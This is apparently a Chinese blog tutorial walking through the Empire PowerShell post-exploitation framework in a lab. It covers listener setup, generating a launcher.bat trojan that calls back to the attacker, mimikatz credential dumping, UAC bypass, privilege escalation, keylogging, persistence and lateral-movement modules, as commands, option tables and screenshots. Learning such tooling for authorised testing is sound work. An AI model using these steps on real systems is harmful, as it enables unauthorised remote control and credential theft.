---
title: Empire
date: 2022-01-07 17:08:17
tags:
    - Powershell

---

<!--more-->

·什么是powershell，windows为什么要用powershell，怎么用，什么时候用。

## Powershell

PowerShell首先是个Shell，定义好了一堆命令与操作系统，特别是与文件系统交互，能够启动应用程序，甚至操纵应用程序。PowerShell还能允许将几个命令组合起来放到文件里执行，实现文件级的重用，也就是说有脚本的性质。且PowerShell能够充分利用.Net类型和COM对象，来简单地与各种系统交互，完成各种复杂的、自动化的操作。

**为什么使用powershell:**

Linux的命令提示符（当然他们叫Shell）。正则表达式，管道，各种神奇的命令，组合起来就能高效完成很多复杂的任务。效率实在是高。流了n年的哈喇子以后，终于有幸用上了Win7，邂逅了cmd的升级版：Windows PowerShell。从此暗爽无比，原来Windows下也有这样的利器呀~



# Empire

一款只针对win系统的后渗透神器，该工具是基于Powershell脚本的攻击框架

主要实现对内网、对域的攻击，提权横向移动等等



和CS、msf使用方法相同

开个监听器，生成payload让主机运行并上线，然后进入主机控制台进行操作主机

https://github.com/EmpireProject/Empire

# 安装

虽然说是针对win平台的，却只能安装再linux系统上

linux系统需要python2.7环境

可能安装的时候缺少很多python模块，可以去网上搜一下怎么解决

```
git clone http://github.com/EmpireProject/Empire.git
sudo ./Empire/setup/install.sh
sudo ./setup/reset.sh
启动命令
sudo ./Empire/empire
```

![image-20211109180954141](https://s2.loli.net/2022/03/26/tD3Fr6XiMaf7HQq.png)

# 实际操作

可以通过help命令查看Empire的帮助信息

![image-20211109181049986](https://s2.loli.net/2022/03/26/w2P6ziF9uYXEbDa.png)

```
agents            Jump to the Agents menu.跳转到代理菜单。
creds             Add/display credentials to/from the database.					
				  在数据库中添加/显示凭据。
exit              Exit Empire	退出
help              Displays the help menu.显示“帮助”菜单。
interact          Interact with a particular agent.
				  与特定的代理交互
list              Lists active agents or listeners.
				  列出活动代理或监听器。
listeners         Interact with active listeners.
				  与活动监听器交互。
load              Loads Empire modules from a non-standard folder.								  从非标准文件夹加载模块。
plugin            Load a plugin file to extend Empire.
				  加载插件文件以扩展
plugins           List all available and active plugins.
				  列出所有可用的和活动的插件。
preobfuscate      Preobfuscate PowerShell module_source files
				  预使用PowerShell模块\源文件 
reload            Reload one (or all) Empire modules.
				  重新加载一个（或全部）帝国模块。
report            Produce report CSV and log files: sessions.csv, credentials.csv, master.log		 报表生成报表CSV和日志文件
reset             Reset a global option (e.g. IP whitelists).
				  重置全局选项（例如IP白名单）。
resource          Read and execute a list of Empire commands from a file.		从文件中读取并执行命令列表。
searchmodule      Search Empire module names/descriptions.
				  搜索模块名称/描述
set               Set a global option (e.g. IP whitelists).
				   设置全局选项（例如IP白名单）。 
show              Show a global option (e.g. IP whitelists).
				   显示全局选项（例如IP白名单）。 
usemodule         Use an Empire module.使用帝国模块
usestager         Use an Empire stager.

```

## 建立监听器

拿到这个工具，我们首先要做的就是设置一个本地的监听器，我们可以使用listeners命令跳转到监听模块的主目录，使用list命令查看活动中的监听器

```
listeners
list
```

![image-20211109182225425](https://s2.loli.net/2022/03/26/SwLpN159GhWBaFC.png)

这里我们使用最基础的http模块

![image-20211109182442373](https://s2.loli.net/2022/03/26/zUKEowq6c9SWgrY.png)

使用info命令可以查看一些基本信息

```
(Empire: listeners/http) > info

    Name: HTTP[S]
Category: client_server

Authors:
  @harmj0y

Description:
  Starts a http[s] listener (PowerShell or Python) that uses a
  GET/POST approach.

HTTP[S] Options:

  Name              Required    Value                            Description
  ----              --------    -------                          -----------
  SlackToken        False                                        Your SlackBot API token to communicate with your Slack instance.
  ProxyCreds        False       default                          Proxy credentials ([domain\]username:password) to use for request (default, none, or other).
  KillDate          False                                        Date for the listener to exit (MM/dd/yyyy).
  Name              True        http                             Name for the listener.
  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.
  DefaultDelay      True        5                                Agent delay/reach back interval (in seconds).
  DefaultLostLimit  True        60                               Number of missed checkins before exiting
  WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).
  SlackChannel      False       #general                         The Slack channel or DM that notifications will be sent to.
  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile for the agent.
                                process.php|Mozilla/5.0 (Windows
                                NT 6.1; WOW64; Trident/7.0;
                                rv:11.0) like Gecko
  Host              True        http://192.168.188.133:80        Hostname/IP for staging.
  CertPath          False                                        Certificate path for https listeners.
  DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0).
  Proxy             False       default                          Proxy to use for request (default, none, or other).
  UserAgent         False       default                          User-agent string to use for the staging request (default, none, or other).
  StagingKey        True        sbjBH>l9YpLDA%)~5*7#i/VaNo&we}[^ Staging key for initial agent negotiation.
  BindIP            True        0.0.0.0                          The IP to bind to on the control server.
  Port              True        80                               Port for the listener.
  ServerVersion     True        Microsoft-IIS/7.5                Server header for the control server.
  StagerURI         False                                        URI for the stager. Must use /download/. Example: /download/stager.php

```

使用set命令可以添加用户名和端口，execute命令是用于开启监听

```
(Empire: listeners/http) > set Name cyp
(Empire: listeners/http) > set Host http://192.168.188.133：777
(Empire: listeners/http) > set Port 777
(Empire: listeners/http) > execute

```

![image-20211109184210104](https://s2.loli.net/2022/03/26/9dwHGFD3JpcW2qy.png)

然后可以使用back命令回到上一级再用list命令可以查看到我们新添加的用户和端口号

![](https://s2.loli.net/2022/03/26/9dwHGFD3JpcW2qy.png)

## 建立一个木马

生成玩监听之后，我们需要做的就是生成一个客户端

回到主界面用usestager查看所有的生成方式（multi是通用，osx是mac系统）

![image-20211109184645539](https://s2.loli.net/2022/03/26/iX3IBuL452Hrnsp.png)

Windows 就选择 launcher_bat launcher_vbs 等， PHP 就选择 hop_php  。这里我选择一个windows/launcher_bat，然后再info一下

```
(Empire: stager/windows/launcher_bat) > info

Name: BAT Launcher

Description:
  Generates a self-deleting .bat launcher for
  Empire.

Options:

  Name             Required    Value             Description
  ----             --------    -------           -----------
  Listener         True                          Listener to generate stager for.
  OutFile          False       /tmp/launcher.bat File to output .bat launcher to,
                                                 otherwise displayed on the screen.
  Obfuscate        False       False             Switch. Obfuscate the launcher
                                                 powershell code, uses the
                                                 ObfuscateCommand for obfuscation types.
                                                 For powershell only.
  ObfuscateCommand False       Token\All\1,Launcher\STDIN++\12467The Invoke-Obfuscation command to use.
                                                 Only used if Obfuscate switch is True.
                                                 For powershell only.
  Language         True        powershell        Language of the stager to generate.
  ProxyCreds       False       default           Proxy credentials
                                                 ([domain\]username:password) to use for
                                                 request (default, none, or other).
  UserAgent        False       default           User-agent string to use for the staging
                                                 request (default, none, or other).
  Proxy            False       default           Proxy to use for request (default, none,
                                                 or other).
  Delete           False       True              Switch. Delete .bat after running.
  StagerRetries    False       0                 Times for the stager to retry
                                                 connecting.

```

执行：usestager launcher_vbs  监听列表的名字 #这里就是cookie11, cookie11就是我刚刚设置的监听列表名字 （set Listener cookie11）

![image-20211109200757858](https://s2.loli.net/2022/03/26/5rTvSqKEZuGmDFx.png)

然后我们回到Empire文件夹位置打开终端`ls /tmp`查看临时文件

![image-20211109201750105](https://s2.loli.net/2022/03/26/z8AmKnosk9yMtUL.png)

可以看到是有个lacuncher.bat文件生成，这个文件相当于一个木马，我们把这个木马放到我们想要渗透的目标机器，让目标机器执行执行这个文件，我们这边就可以看到回显连接成功了！

![image-20211110103836155](https://s2.loli.net/2022/03/26/UY1FDIocZHSQgMq.png)

连接成功之后，我们可以用一个agents命令看到一个会话菜单

![image-20211110104800549](https://s2.loli.net/2022/03/26/yqtDm5afXdMAUpW.png)

如果想和用户进行交互操作，使用一个`interact 用户名`命令即可进入到这个会话里面来

![image-20211110114912613](https://s2.loli.net/2022/03/26/7INBrFPXjTLlV9h.png)

同样我们可以使用一个info或者help查看一下基本信息以及一些基本操作（直接可以shell命令）

值得关注的是 bypassuac（提权模块）、dowanload 下载文件、mimikatz 获取  hash、upload上传文件、usemodule 使用 powershell moudle（类似于 metasploit 的 exp 中的  rb 文件，很强大）、shell+command 执行 cmd 命令。 injectshellcode 注入某些进程 shellcode。

```
sysinfo查看系统信息
```

![image-20211110105759033](https://s2.loli.net/2022/03/26/CydhLOe5KoMvxpJ.png)

## 查看各类密码

Mimikatz 是一个工具，它可以从内存中提取明文密码、哈希值、PIN码和Kerberos票据。Mimikatz还可以执行传递哈希值、传递票据或建立金票。

FreeBuf科普时间

> krbtgt账户：每个域控制器都有一个“krbtgt”的用户账户，是KDC的服务账户，用来创建票据授予服务（TGS）加密的密钥。
>
> 黄金票据（Golden Ticket）：简单来说，它能让黑客在拥有普通域用户权限和krbtgt hash的情况下，获取域管理员权限。
>
> dcsync：mimikatz中的功能，可以有效地“假冒”一个域控制器，并可以向目标域控制器请求帐户密码数据。

Empire一般可以将mimikatz的输出保存在本地，一般可以使用creds进行查看

```
creds krbtgt/plaintext/hash/searchTerm
```

即可查看各类密码

![image-20211110111709572](https://s2.loli.net/2022/03/26/iwMOlqz7PERAcbr.png)

usemodule credentials/ 可以查看一些相关证书

![image-20211110112501213](https://s2.loli.net/2022/03/26/Ur7djgZAuhxKOTL.png)

里面有个金票和银票，可以进行一些金票银票的攻击（这个我目前不太了解）

![image-20211110112751249](https://s2.loli.net/2022/03/26/aAMbhrt6n7RGdKz.png)

然后我们可随意的看一下

## 信息收集

Empire可以借助powerview进行各类信息收集，还是使用里面的一个模块，这里我使用`usemodule situational_awareness/network/portscan`

![image-20211110113112501](https://s2.loli.net/2022/03/26/9NHRIc38DFwblUJ.png)

以下是一些扫描的信息，然后execute执行一下就好

![image-20211110113316752](https://s2.loli.net/2022/03/26/VGi3BD4vq6XJgEo.png)

![image-20211110113600403](https://s2.loli.net/2022/03/26/bciCljInFD8KqNH.png)

没扫出什么，可以换个arpscan试试

## Uac Bypasses

为了远程执行目标的exe或者bat可执行文件绕过此安全机制，以此叫BypassUAC（不进行弹窗直接运行执行文件），差不多是提权的意思。

执行bypassuac 监听用户名

![image-20211110115535550](https://s2.loli.net/2022/03/26/mzaiZpDyr8FN3St.png)

直接弹出一个事件管理器（我也不知道怎么弹出来的……）

![image-20211117120320807](https://s2.loli.net/2022/03/26/jJG1m2KEcWXysH4.png)

提权后查看的mimikatz

![image-20211117120406383](https://s2.loli.net/2022/03/26/DHEmgubFZlUqLs8.png)

或者用其他的模块

usemodule privesec里面的，这里是用的是一个ms16-135（具体为什么使用这个我也只是跟着别人操练的）

![image-20211110193731879](https://s2.loli.net/2022/03/26/AnxkYBjPaTKcWm8.png)

![image-20211110193637727](https://s2.loli.net/2022/03/26/ZsOaoDQ3Y61xALu.png)

## PowerUP

usemodule privesc/powerup/find_dllhijack

这是一个检测脚本，一般可以用它做一些文件的检查

![image-20211110194856440](https://s2.loli.net/2022/03/26/vqyWIJh7MRtlAZ1.png)

## Collection

收集客户端的信息，键盘记录、屏幕截图、浏览器密码导出等功能



![image-20211110211702979](https://s2.loli.net/2022/03/26/TliYa1ZJUwogEpO.png)

## 权限维持

persistence

![image-20211110212236276](https://s2.loli.net/2022/03/26/TzaAu2LbKMdN4cg.png)

## lateral_movement

![image-20211110212447819](https://s2.loli.net/2022/03/26/zUWhdYQ6aD1cZs7.png)

